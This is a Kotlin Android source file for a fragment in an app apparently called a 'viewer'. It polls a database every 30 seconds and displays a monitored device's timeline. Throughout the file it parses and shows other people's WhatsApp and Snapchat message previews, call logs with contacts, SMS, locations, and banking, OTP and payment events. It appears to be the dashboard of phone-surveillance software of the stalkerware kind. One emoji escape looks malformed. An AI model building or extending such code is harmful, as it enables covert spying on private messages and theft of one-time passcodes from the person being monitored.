package com.kojoscope.viewer.ui.activity

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.TextView
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.kojoscope.viewer.R
import com.kojoscope.viewer.net.DeviceRepo
import com.kojoscope.viewer.net.RtdbClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.TimeZone

class TimelineFragment : Fragment() {

    private var deviceId: String = ""
    private var recycler: RecyclerView? = null
    private var progress: ProgressBar? = null
    private var empty: TextView? = null
    private val adapter = TimelineAdapter(emptyList())
    private var pollJob: Job? = null
    private val client = RtdbClient.getInstance()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        return inflater.inflate(R.layout.fragment_timeline, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        recycler = view.findViewById(R.id.recycler)
        progress = view.findViewById(R.id.progress)
        empty = view.findViewById(R.id.empty)
        recycler?.layoutManager = LinearLayoutManager(context)
        recycler?.adapter = adapter

        val repo = DeviceRepo(requireContext())
        deviceId = repo.getSelectedDeviceId()

        startPolling()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        pollJob?.cancel()
        recycler = null
    }

    private fun startPolling() {
        pollJob = CoroutineScope(Dispatchers.Main).launch {
            while (isActive) {
                val current = DeviceRepo(requireContext()).getSelectedDeviceId()
                if (current.isNotEmpty()) deviceId = current
                if (deviceId.isNotEmpty()) loadTimeline()
                delay(30000)
            }
        }
    }

    private suspend fun loadTimeline() {
        withContext(Dispatchers.Main) {
            progress?.visibility = View.VISIBLE
            empty?.visibility = View.GONE
        }
        val entries = withContext(Dispatchers.IO) { fetchAll(deviceId) }
        withContext(Dispatchers.Main) {
            progress?.visibility = View.GONE
            if (entries.isEmpty()) {
                empty?.visibility = View.VISIBLE
            } else {
                adapter.update(buildItems(entries))
            }
        }
    }

    private suspend fun fetchAll(deviceId: String): List<TimelineEntry> {
        val all = mutableListOf<TimelineEntry>()
        var oldestKey: String? = null
        for (page in 0 until 30) {
            val query = buildString {
                append("orderBy=%22%24key%22&limitToLast=1000")
                if (oldestKey != null) append("&endAt=").append(
                    java.net.URLEncoder.encode(JSONObject.quote(oldestKey), "UTF-8")
                )
            }
            val resp = client.get("devices/$deviceId/timeline", query)
            if (resp == null) break
            val keys = mutableListOf<String>()
            val iter = resp.keys()
            while (iter.hasNext()) keys.add(iter.next())
            if (keys.isEmpty()) break
            keys.forEach { k ->
                val v = resp.getJSONObject(k)
                all.add(parseEntry(v))
            }
            if (keys.size < 1000) break
            val newOldest = keys.minOrNull()
            if (newOldest == oldestKey) break
            oldestKey = newOldest
        }
        return all.sortedByDescending { it.tsMs }
    }

    private fun parseEntry(obj: JSONObject): TimelineEntry {
        fun optStr(key: String): String? {
            val v = obj.optString(key, "")
            return if (v.isNotEmpty()) v else null
        }
        return TimelineEntry(
            tsMs = obj.optLong("ts_ms"),
            type = obj.optString("type", ""),
            contactName = optStr("contactName"),
            contact = optStr("contact"),
            messagePreview = optStr("messagePreview"),
            duration = obj.optLong("duration").takeIf { it > 0 },
            direction = optStr("direction"),
            groupName = optStr("groupName"),
            rawText = optStr("rawText"),
            packageName = optStr("packageName"),
            isIncoming = optStr("isIncoming"),
            chatCategory = optStr("chatCategory"),
            isGroup = optStr("isGroup"),
            conversationTitle = optStr("conversationTitle")
        )
    }

    private fun isWhatsApp(e: TimelineEntry): Boolean =
        e.type == "whatsapp_message" || e.packageName == "com.whatsapp"

    private fun waClassOf(e: TimelineEntry): String {
        if (e.type != "whatsapp_message") return ""
        return when {
            e.chatCategory == "group_chat" || e.isGroup.equals("true", true) -> "group"
            e.chatCategory == "individual_chat" || e.isGroup.equals("false", true) -> "individual"
            !e.groupName.isNullOrEmpty() -> "group"
            else -> "individual"
        }
    }

    private fun waTag(e: TimelineEntry): String {
        if (!isWhatsApp(e)) return ""
        return if (waClassOf(e) == "group") "WhatsApp Group" else "WhatsApp"
    }

    private fun snapchatTag(e: TimelineEntry): String =
        if (e.type == "snapchat_message" || e.packageName == "com.snapchat.android") "Snapchat" else ""

    private fun bankingTag(e: TimelineEntry): String {
        val t = e.type.lowercase()
        val p = e.packageName?.lowercase() ?: ""
        if (t.contains("banking") || t.contains("financial") || t.contains("otp") ||
            t.contains("payment") || t.contains("transaction")) return "Banking"
        if (p.contains("bank") || p.contains("paypal") || p.contains("stripe") || p.contains("chase")) return "Banking"
        return ""
    }

    private fun typeTag(e: TimelineEntry): String {
        val t = e.type.lowercase()
        return when {
            t.contains("snapchat") -> "Snapchat"
            t.contains("whatsapp") -> "WhatsApp"
            t.contains("call") -> "Call"
            t.contains("sms") || t.contains("message") -> "SMS"
            t.contains("banking") || t.contains("financial") || t.contains("otp") ||
                t.contains("payment") || t.contains("transaction") -> "Banking"
            t.contains("location") -> "Location"
            t.contains("notification") -> "Notification"
            t.contains("app") -> "App"
            else -> ""
        }
    }

    private fun typeIcon(type: String): String {
        val t = type.lowercase()
        return when {
            t.contains("snapchat") -> "\uD83D\uDCF8"
            t.contains("whatsapp") -> "\uD83D\uDCE4"
            t.contains("call") -> "\uD83D\uDEDE"
            t.contains("sms") || t.contains("message") -> "\uD83D\uDCEF"
            t.contains("banking") || t.contains("financial") || t.contains("otp") || t.contains("payment") || t.contains("transaction") -> "\uD83D\uDCB3"
            t == "location" || t.contains("location") -> "\uD83D\uDCCD"
            t.contains("notification") -> "\uD83D\uDD14"
            t.contains("app") -> "\uD83D\uDCFCB"
            else -> "\uD83D\uDDD1"
        }
    }

    private fun buildItems(entries: List<TimelineEntry>): List<TimelineItem> {
        val dayFmt = SimpleDateFormat("MMM dd, yyyy", Locale.getDefault())
        dayFmt.timeZone = TimeZone.getTimeZone("Asia/Karachi")
        val grouped = LinkedHashMap<String, MutableList<TimelineEntry>>()
        for (e in entries) {
            val day = dayFmt.format(e.tsMs)
            grouped.getOrPut(day) { mutableListOf() }.add(e)
        }
        val result = mutableListOf<TimelineItem>()
        for ((day, dayEntries) in grouped) {
            val locs = dayEntries.count { it.type.lowercase().contains("location") }
            val calls = dayEntries.count { it.type.lowercase().contains("call") }
            val msgs = dayEntries.count { it.type.lowercase().contains("whatsapp") || it.type.lowercase().contains("message") }
            val snaps = dayEntries.count { it.type.lowercase().contains("snapchat") }
            val summary = buildList<String> {
                if (locs > 0) add("$locs \uD83D\uDCCD")
                if (calls > 0) add("$calls \uD83D\uDEDE")
                if (msgs > 0) add("$msgs \uD83D\uDCE4")
                if (snaps > 0) add("$snaps \uD83D\uDCF8")
            }.joinToString(" ")
            result.add(TimelineItem.DayHeader(day, summary))

            val isCall = dayEntries.size == 1 && dayEntries[0].type.lowercase().contains("call")
            if (isCall) {
                val e = dayEntries[0]
                val dirIcon = when (e.isIncoming) {
                    "true" -> "\u2193"
                    "false" -> "\u2191"
                    else -> ""
                }
                val contact = e.contactName?.takeIf { it.isNotBlank() } ?: "Unknown"
                val contactB = e.contact?.takeIf { it.isNotBlank() }
                val dur = e.duration?.let { "(%s)".format(formatDur(it)) } ?: ""
                val tag = waTag(e).ifEmpty { typeTag(e) }
                val tags = listOf(tag).filter { it.isNotEmpty() }
                result.add(TimelineItem.Entry(
                    e, "\uD83D\uDEDE",
                    "$dirIcon $contact $dur".trim(),
                    when {
                        contactB != null && contactB != contact -> contactB
                        e.groupName?.isNotBlank() == true -> e.groupName!!
                        else -> e.messagePreview ?: ""
                    },
                    tags
                ))
                continue
            }

            val groupedChats = LinkedHashMap<String, MutableList<TimelineEntry>>()
            dayEntries.forEach { e ->
                val key = buildString {
                    append(typeIcon(e.type))
                    if (isWhatsApp(e)) append("·").append(waClassOf(e))
                    append("·")
                    append(e.contactName?.takeIf { it.isNotBlank() } ?: e.contact ?: "(no contact)")
                    append("·")
                    append(e.groupName?.takeIf { it.isNotBlank() } ?: "")
                }
                groupedChats.getOrPut(key) { mutableListOf() }.add(e)
            }

            for ((key, chatEntries) in groupedChats) {
                val sorted = chatEntries.sortedByDescending { it.tsMs }
                val first = sorted[0]
                val icon = typeIcon(first.type)
                val contact = first.contactName?.takeIf { it.isNotBlank() }
                    ?: first.contact?.takeIf { it.isNotBlank() }
                    ?: "(no contact)"
                val preview = first.messagePreview?.takeIf { it.isNotBlank() }
                    ?: first.rawText?.takeIf { it.isNotBlank() }
                    ?: first.conversationTitle?.takeIf { it.isNotBlank() }
                    ?: ""
                val groupLabel = first.groupName?.takeIf { it.isNotBlank() }
                    ?.let { "in \"$it\"" } ?: ""
                val title = if (preview.isNotEmpty()) "$contact: $preview" else contact
                val tags = buildList<String> {
                    add(waTag(first))
                    add(snapchatTag(first))
                    add(bankingTag(first))
                    add(typeTag(first))
                }.distinct().filter { it.isNotEmpty() }
                val subtitle = buildList<String> {
                    if (isWhatsApp(first) && waClassOf(first) == "group") add("Group chat")
if (groupLabel.isNotEmpty()) add(groupLabel)
                add("${chatCountMessages(sorted)} msgs")
                }.joinToString(" • ")
                result.add(TimelineItem.Entry(first, icon, title, subtitle, tags))
            }
        }
        return result
    }

    private fun chatCountMessages(list: List<TimelineEntry>): Int =
        list.filter { it.type.contains("message") || it.type.contains("whatsapp") }.size

    private fun formatDur(ms: Long): String {
        val s = ms / 1000
        val m = s / 60
        val sec = s % 60
        return when {
            m > 0 -> "${m}m ${sec}s"
            else -> "${sec}s"
        }
    }
}
